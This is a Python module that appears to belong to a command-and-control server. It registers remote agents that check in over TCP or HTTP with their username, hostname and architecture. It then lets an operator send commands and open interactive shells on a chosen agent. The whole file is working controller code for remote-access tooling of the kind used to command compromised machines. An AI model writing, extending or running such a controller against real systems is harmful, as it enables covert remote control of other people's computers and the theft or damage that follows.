from core.utils.config import CONFIG
from core.agents import commands
from core.utils import common
from core.transport import tcp, http

from dataclasses import dataclass, asdict
from flask import request

printer = common.Print_str()

AGENTS = {}

@dataclass
class Agent:
    id: str
    ip: str
    username: str
    conn_type: str
    # timestamp: datetime = common.time_now()
    conn: any = None
    status: str = "active"
    interval: str = ""
    hostname: str = ""
    arch: str = ""

def handle(conn_type, conn=None, addr=None):
    
    match conn_type:
        case "tcp":
            handle_tcp(conn, addr)
        case "http":
            handle_http(conn)
        case _:
            pass

def handle_tcp(conn, addr):

    while True:
        id = common.new_id()
        if id not in AGENTS:
            break

    _, data = tcp.recv_data(conn)
    username, hostname, arch = data.split(CONFIG.agent.seperator)


    agent = Agent(
        id=id,
        ip=addr[0],
        username=username,
        hostname=hostname,
        conn=conn,
        conn_type="tcp",
        interval="real-time",
        arch=arch,
    )

    AGENTS[id] = agent
    print(f"[+] New tcp agent connected: {agent}")



def handle_http(req):
    
    while True:
        id = common.new_id()
        if id not in AGENTS:
            break

    _, data = http.recv(req)
    print("DATA: ", data)
    username, hostname, arch = data.split(CONFIG.agent.seperator)


    agent = Agent(
        id=id,
        ip=http.get_ip(req),
        username=username,
        hostname=hostname,
        conn_type="http",
        interval=CONFIG.agent.heartbeat_interval,
        arch=arch,
    )

    AGENTS[id] = agent
    print(f"[+] New http agent connected: {agent}")


def handle_interact(conn, id):
    try: 
        agent = AGENTS.get(id,"")
        if not agent:
            return printer.fail(f"Agent with id [{id}] not found")
        
        header ="INTERACT"
        conn_type = agent.conn_type
        
        tcp.send_data(conn, printer.success(f"Interacting with {id}"), header)
        tcp.send_data(conn, id, header)
        
        while True:
            _, raw = tcp.recv_data(conn)
            if raw is None:
                print(f"[!] Connection closed.")
                break

            cmd = raw.strip().split()
            if not cmd:
                continue

            match cmd:

                case ["cmd"]:
                    response = commands.cmd_help()
                    tcp.send_data(conn, response)
                    
                case ["cmd", *cmd]:
                    cmd = " ".join(cmd)
                    response = commands.cmd(agent, cmd, conn_type)
                    tcp.send_data(conn, response)
                    
                case ["shell"]:
                    header = commands.AGENT_COMMANDS.get("shell")["header"]
                    response = commands.shell(conn, agent)
                    tcp.send_data(conn, response, header)
                    tcp.send_data(conn, " ")

                case ["exit"]:
                    return commands.exit()
                    
                case ["help"] | ["?"]:
                    response = commands.help()
                    tcp.send_data(conn, response)
                
                case _:
                    unknown = " ".join(c for c in cmd)
                    response = printer.warning(f"Unknown command: {unknown}")
                    tcp.send_data(conn, response)


    except Exception:
        agent.status = "dead"
        if agent.conn_type == "tcp":
            tcp.close(agent.conn)
        return printer.fail(f"Agent {agent.id} is dead")


def handle_task():
    return "OK", 200

def handle_result():
    data = request.get_data()
    print(data)
    return "OK", 200